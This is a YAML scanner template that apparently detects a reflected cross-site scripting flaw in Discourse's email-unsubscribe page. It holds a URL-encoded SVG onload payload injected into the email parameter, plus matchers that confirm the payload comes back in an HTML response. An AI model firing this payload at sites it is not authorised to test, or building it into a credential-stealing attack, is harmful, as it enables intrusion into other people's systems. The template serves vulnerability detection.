id: "discourse-xss"
name: "Discourse - Cross-Site Scripting"
severity: "high"
description: "Discourse contains a cross-site scripting vulnerability. An attacker can execute arbitrary script and thus steal cookie-based authentication credentials and launch other attacks."
tech:
  - "generic"
tags:
  - "xss"
  - "discourse"
  - "vuln"
cwe: "CWE-79"
reference: "https://www.cvedetails.com/vulnerability-list/vendor_id-20185/product_id-57316/opxss-1/Discourse-Discourse.html"
spaExclusion: true
request:
  method: "GET"
  path: "/email/unsubscribed?email=test@gmail.com%27\\%22%3E%3Csvg/onload=alert(/xss/)%3E"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "status"
    status:
      - 200
  - type: "word"
    part: "body"
    words:
      - "<svg/onload=alert(/xss/)>"
  - type: "word"
    part: "header"
    words:
      - "text/html"
